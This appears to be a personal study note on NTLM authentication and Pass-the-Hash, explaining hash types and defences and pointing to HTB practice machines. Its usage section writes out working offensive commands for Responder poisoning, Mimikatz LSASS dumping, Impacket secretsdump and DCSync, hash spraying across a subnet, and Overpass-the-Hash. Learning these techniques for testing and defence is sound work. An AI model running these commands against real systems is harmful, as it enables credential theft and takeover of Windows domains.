# 📌 NTLM and Pass-the-Hash

> NTLM is the legacy Windows auth protocol that never dies — and because hashes are static until the password changes, stealing them is as good as stealing the password.

---

## 🔍 Definition

**NTLM (NT LAN Manager)** is a Microsoft authentication protocol suite using a challenge-response mechanism based on NTLM hashes (unsalted MD4 of the password). Despite Kerberos being the default since Windows 2000, NTLM is still present in every Windows environment for backward compatibility, local auth, and non-domain scenarios.

**Pass-the-Hash (PtH)** is the technique of reusing a stolen NTLM hash to authenticate as that user — without ever cracking or knowing the plaintext password. The hash *is* the credential.

---

## 🧠 Core Concepts

- **LM Hash** — older, weak hash. Split password into two 7-char chunks, DES-encrypted. Basically dead but sometimes stored for compat
- **NT Hash (NTLM Hash)** — MD4 of the UTF-16LE password. No salt. Same password = same hash across all machines. This is what gets passed
- **NTLMv1** — older challenge-response. Weak, crackable fast. Rarely seen
- **NTLMv2** — current version. Challenge-response using HMAC-MD5. Harder to crack but still capturable via Responder
- **LSASS (lsass.exe)** — Local Security Authority Subsystem Service. Stores password hashes and Kerberos tickets in memory for active sessions. **Primary target for credential dumping**
- **SAM (Security Account Manager)** — local database on every Windows machine storing local account hashes. Readable only as SYSTEM
- **NTDS.dit** — AD database on the DC. Contains all domain user hashes. The holy grail
- **Responder** — tool that poisons LLMNR/NBT-NS/mDNS to capture NTLMv2 hashes passively when users try to access non-existent hosts
- **Overpass-the-Hash (OPtH)** — use an NTLM hash to request a Kerberos TGT — converts NTLM access into Kerberos access (more stealthy, bypasses NTLM restrictions)
- **Pass-the-Ticket** — steal and reuse Kerberos tickets instead of hashes (Kerberos variant of PtH)

---

## ⚙️ How NTLM Challenge-Response Works

1. **Client → Server: NEGOTIATE_MESSAGE** — Client says "I want to auth via NTLM"
2. **Server → Client: CHALLENGE_MESSAGE** — Server sends a random 8-byte challenge (nonce)
3. **Client → Server: AUTHENTICATE_MESSAGE** — Client computes HMAC-MD5(NT_hash + challenge + timestamp + client_nonce) → sends the response
4. **Server/DC validates** — DC looks up NT hash from NTDS.dit, computes same response, compares

> 💡 The NT hash never travels over the wire in NTLMv2 — only the derived response does. But if you can capture the challenge + response (via Responder), you can crack it offline to recover the hash, then use the hash for PtH.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| NT Hash | MD4(UTF-16LE(password)) — the hash used in PtH |
| NTLMv2 Hash | Challenge-response blob captured by Responder — needs cracking first |
| LSASS Dump | Extracting hashes/tickets from lsass.exe memory |
| DCSync | Pretending to be a DC and requesting hash replication from the real DC |
| Mimikatz | The tool for LSASS dumping, PtH, and ticket manipulation |
| Evil-WinRM | Shell via WinRM using a hash or password |
| Impacket | Python suite with wmiexec, psexec, secretsdump — all support PtH |
| Pass-the-Certificate | Newer variant — use stolen X.509 cert + private key for auth (AD CS attacks) |
| Protected Users group | Members have Kerberos-only auth + no NTLM — PtH stops working for them |
| LAPS | Local Admin Password Solution — unique randomized local admin passwords, limits PtH spray |

---

## 🔥 Important Details & Gotchas

- **NTLM hashes are NOT salted** — same password always produces the same hash. This is why PtH works: the hash itself authenticates, not the plaintext
- **PtH only works with local or domain admin accounts over NTLM** — standard domain users can't PtH to workstations due to UAC token filtering (unless LocalAccountTokenFilterPolicy is set, or you're using the built-in RID 500 admin)
- **NTLMv2 hashes from Responder still need cracking** — you capture the challenge-response, not the raw NT hash. Crack first: `hashcat -m 5600 ntlmv2.hash rockyou.txt`
- **CVE-2025-24054** — March 2025 NTLM hash leak via `.library-ms` files. Triggers NTLM auth just by previewing in File Explorer. Patched but widely exploited against unpatched systems
- **Overpass-the-Hash is stealthier than PtH** — converts the NTLM hash into a Kerberos TGT via a crafted AS-REQ. Now you have a Kerberos ticket, not NTLM auth — bypasses NTLM-blocking defenses
- **DCSync requires replication rights** (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) — typically only Domain Admins have these, but ACL abuse can grant them to lower-priv users
- **Hashes persist until password changes** — a stolen NTLM hash stays valid indefinitely. That's the core problem

---

## 🌍 Real-World Usage / Examples

**Capture NTLMv2 hashes passively (Responder):**
```bash
sudo responder -I eth0 -rdwv
# Captures when users try to access \\nonexistenthost
# Output: [SMB] NTLMv2-SSP Username : CORP\jdoe
# Crack: hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

**Dump hashes from LSASS (Mimikatz — Windows):**
```
privilege::debug
sekurlsa::logonpasswords
# Outputs NT hash for every cached session
```

**Dump hashes remotely (Impacket secretsdump):**
```bash
# With password:
impacket-secretsdump corp.local/Administrator:pass@<DC-IP>

# With hash:
impacket-secretsdump corp.local/Administrator@<DC-IP> -hashes :ntlmhash

# Local SAM dump (needs SYSTEM on the box):
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Pass-the-Hash (lateral movement):**
```bash
# Evil-WinRM
evil-winrm -i <IP> -u Administrator -H <ntlmhash>

# CrackMapExec spray across subnet
crackmapexec smb 10.10.10.0/24 -u Administrator -H <ntlmhash> --local-auth

# Impacket psexec
impacket-psexec corp.local/Administrator@<IP> -hashes :<ntlmhash>

# Impacket wmiexec (stealthier — no service creation)
impacket-wmiexec corp.local/Administrator@<IP> -hashes :<ntlmhash>
```

**Overpass-the-Hash (NTLM hash → Kerberos TGT):**
```bash
# Mimikatz (Windows):
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe
# Opens new cmd with Kerberos session — can now klist and use tickets

# Rubeus:
.\Rubeus.exe asktgt /user:Administrator /rc4:<ntlmhash> /ptt
```

**DCSync (dump all domain hashes from Kali):**
```bash
impacket-secretsdump corp.local/domainadmin:pass@<DC-IP>
# Or with PtH:
impacket-secretsdump -hashes :<ntlmhash> corp.local/Administrator@<DC-IP>
```

**Real-world context:** APT29 (Cozy Bear), Scattered Spider, and essentially every ransomware gang (LockBit, Black Basta, Akira) uses PtH as a core lateral movement step. The 2025 CVE-2025-24054 campaign hit Polish and Romanian government targets with `.library-ms` files to harvest NTLMv2 hashes at scale.

---

## 🔗 Related Topics

- [[Active Directory (AD)]]
- [[Kerberos Authentication]]
- [[Lateral Movement]]
- [[SMB Enumeration]]
- [[Privilege Escalation - Windows]]
- [[AD Certificate Services (AD CS)]]
- [[BloodHound & Attack Path Analysis]]

---

## 📚 Sources / Further Reading

- [Securelist — NTLM Abuse in 2025](https://securelist.com/ntlm-abuse-in-2025/118132/) — current threat landscape
- [Vaadata — PtH Attack Types](https://www.vaadata.com/blog/what-is-pass-the-hash-attacks-types-and-security-best-practices/) — includes Pass-the-Certificate
- [Netwrix — Pass-the-Hash](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/pass-the-hash-attack/) — detection guidance
- [Semperis — Overpass-the-Hash](https://www.semperis.com/blog/how-to-defend-against-overpass-the-hash-attack/) — detailed OPtH breakdown
- HTB Machines: `Forest`, `Sauna`, `Resolute`
